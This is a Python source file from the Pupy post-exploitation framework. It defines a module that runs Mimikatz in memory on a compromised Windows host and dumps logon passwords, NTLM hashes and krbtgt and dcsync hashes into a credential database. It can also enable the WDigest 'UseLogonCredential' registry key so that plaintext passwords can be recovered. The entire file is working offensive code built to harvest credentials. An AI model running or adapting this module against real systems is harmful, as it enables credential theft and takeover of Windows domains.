# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from pupylib.PupyModule import (
    config, PupyArgumentParser,
    REQUIRE_NOTHING
)

from pupylib.PupyOutput import Error, Table

from modules.memory_exec import MemoryExec
from modules.lib.windows.memory_exec import exec_pe
from pupylib.utils.credentials import Credentials

import os.path
import re

__class_name__="Mimikatz"

@config(cat="exploit", compat="windows")
class Mimikatz(MemoryExec):
    """
        execute mimikatz from memory (non-interactive)
    """

    dependencies = [
        'pupymemexec',
        'pupwinutils.memexec',
        'pupwinutils.wdigest'
    ]

    io = REQUIRE_NOTHING

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="mimikatz", description=cls.__doc__)
        cls.arg_parser.add_argument(
            'args', nargs='*', help='run mimikatz commands from argv (let empty to use loginPasswords)')
        cls.arg_parser.add_argument(
            '-v', '--verbose', action='store_true', default=False,
            help='Show arguments and stdout')
        cls.arg_parser.add_argument(
            "--wdigest", choices={'check', 'enable', 'disable'},
            default='', help="Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1")

    def run(self, args):

        proc_arch       = self.client.desc["proc_arch"]
        mimikatz_path   = None
        output          = ''

        if '64' in  self.client.desc['os_arch'] and "32" in proc_arch:
            self.error("You are in a x86 process right now. You have to be in a x64 process for running Mimikatz.")
            self.error("Otherwise, the following Mimikatz error will occur after 'sekurlsa::logonPasswords':")
            self.error("'ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process'")
            self.error("Mimikatz has not been executed on the target")
            return

        # for windows 10, if the UseLogonCredential registry is not present or disable (equal to 0), not plaintext password can be retrieved using mimikatz.
        if args.wdigest:
            ok, message = self.client.conn.modules["pupwinutils.wdigest"].wdigest(args.wdigest)
            if ok:
                self.success(message)
            else:
                self.warning(str(message))
            return

        if "64" in proc_arch:
            mimikatz_path = self.client.pupsrv.config.get("mimikatz","exe_x64")
        else:
            mimikatz_path = self.client.pupsrv.config.get("mimikatz","exe_Win32")

        if not os.path.isfile(mimikatz_path):
            self.error("Mimikatz exe %s not found ! please edit Mimikatz section in pupy.conf"%mimikatz_path)
            return

        mimikatz_args = args.args

        if not mimikatz_args:
            mimikatz_args = ['privilege::debug', 'sekurlsa::logonPasswords']

        mimikatz_args.append('exit')

        if args.verbose:
            self.log('Execute: ' + repr(mimikatz_args))

        output = exec_pe(self, mimikatz_args, path=mimikatz_path, interactive=False)
        if not output:
            self.warning('No output')
            return

        if args.verbose:
            self.log(output)

        creds = self.parse_mimikatz(output)
        if not creds:
            self.warning('No credentials found')
            return

        try:
            # store credentials into the database
            db = Credentials(client=self.client, config=self.config)
            db.add(creds)
            self.log(Table(creds, ['domain', 'login', 'hash', 'password']))
            self.success("Credentials stored on the database")
        except:
            self.error('No credentials stored in the database')

    def parse_mimikatz(self, data):
        """
        Parse the output from Invoke-Mimikatz to return credential sets.
        This was directly stolen from the Empire project as well.
        """

        # cred format:
        #   credType, domain, username, password, hostname, sid
        creds = []

        # regexes for "sekurlsa::logonpasswords" Mimikatz output
        regexes = [
            "(?s)(?<=msv :).*?(?=tspkg :)",
            "(?s)(?<=tspkg :).*?(?=wdigest :)",
            "(?s)(?<=wdigest :).*?(?=kerberos :)",
            "(?s)(?<=kerberos :).*?(?=ssp :)",
            "(?s)(?<=ssp :).*?(?=credman :)",
            "(?s)(?<=credman :).*?(?=Authentication Id :)",
            "(?s)(?<=credman :).*?(?=mimikatz)"
        ]

        hostDomain = ""
        domainSid = ""
        hostName = ""

        lines = data.split("\n")
        for line in lines[0:2]:
            if line.startswith("Hostname:"):
                try:
                    domain = line.split(":")[1].strip()
                    temp = domain.split("/")[0].strip()
                    domainSid = domain.split("/")[1].strip()

                    hostName = temp.split(".")[0]
                    hostDomain = ".".join(temp.split(".")[1:])
                except:
                    pass

        for regex in regexes:

            p = re.compile(regex)

            for match in p.findall(data):

                lines2 = match.split("\n")
                username, domain, password = "", "", ""

                for line in lines2:
                    try:
                        if "Username" in line:
                            username = line.split(":",1)[1].strip()
                        elif "Domain" in line:
                            domain = line.split(":",1)[1].strip()
                        elif "NTLM" in line or "Password" in line:
                            password = line.split(":",1)[1].strip()
                    except:
                        pass

                    if password:
                        if username != "" and password != "" and password != "(null)":

                            sid = ""

                            # substitute the FQDN in if it matches
                            if hostDomain.startswith(domain.lower()):
                                domain = hostDomain
                                sid = domainSid

                            store = False
                            category = ''
                            if self.validate_ntlm(password):
                                credType = "Hash"
                                category = 'NTLM hash'
                                if not username.endswith("$"):
                                    store = True

                            else:
                                credType = "Password"
                                category = 'System password'
                                # ignore big hex password
                                if  len(password) < 300:
                                    store = True

                            result = {
                                'Domain': domain,
                                'Login': username,
                                credType:password,
                                'CredType': credType.lower(),
                                'Host': hostName,
                                'sid':sid,
                                'Category': category,
                                'uid': self.client.short_name()
                            }
                            # do not store password if it has already been stored
                            for c in creds:
                                if c == result:
                                    store = False
                            if store:
                                creds.append(result)
                        username, domain, password = "", "", ""

        if len(creds) == 0:
            # check if we have lsadump output to check for krbtgt
            # happens on domain controller hashdumps
            for x in xrange(8,13):
                if lines[x].startswith("Domain :"):

                    domain, sid, krbtgtHash = "", "", ""

                    try:
                        domainParts = lines[x].split(":")[1]
                        domain = domainParts.split("/")[0].strip()
                        sid = domainParts.split("/")[1].strip()

                        # substitute the FQDN in if it matches
                        if hostDomain.startswith(domain.lower()):
                            domain = hostDomain
                            sid = domainSid

                        for x in xrange(0, len(lines)):
                            if lines[x].startswith("User : krbtgt"):
                                krbtgtHash = lines[x+2].split(":")[1].strip()
                                break

                        if krbtgtHash != "":
                            creds.append({
                                'Domain': domain,
                                'Login': username,
                                'Hash': krbtgtHash,
                                'Host': hostName,
                                'CredType': 'hash',
                                'sid': sid,
                                'Category': 'krbtgt hash',
                                'uid': self.client.short_name()
                            })

                    except Exception, e:
                        self.log(Error(e))

        if len(creds) == 0:
            # check if we get lsadump::dcsync output
            if '** SAM ACCOUNT **' in lines:
                domain, user, userHash, dcName, sid = "", "", "", "", ""
                for line in lines:
                    try:
                        if line.strip().endswith("will be the domain"):
                            domain = line.split("'")[1]
                        elif line.strip().endswith("will be the DC server"):
                            dcName = line.split("'")[1].split(".")[0]
                        elif line.strip().startswith("SAM Username"):
                            user = line.split(":")[1].strip()
                        elif line.strip().startswith("Object Security ID"):
                            parts = line.split(":")[1].strip().split("-")
                            sid = "-".join(parts[0:-1])
                        elif line.strip().startswith("Hash NTLM:"):
                            userHash = line.split(":")[1].strip()
                    except:
                        pass

                if domain != "" and userHash != "":
                    creds.append({
                        'Domain': domain,
                        'Login': user,
                        'Hash': userHash,
                        'Host': dcName,
                        'CredType': 'hash',
                        'SID':sid, 'Category':
                        'NTLM hash',
                        'uid': self.client.short_name()
                    })

        return creds

    def validate_ntlm(self, data):
        allowed = re.compile("^[0-9a-f]{32}", re.IGNORECASE)
        if allowed.match(data):
            return True
        else:
            return False
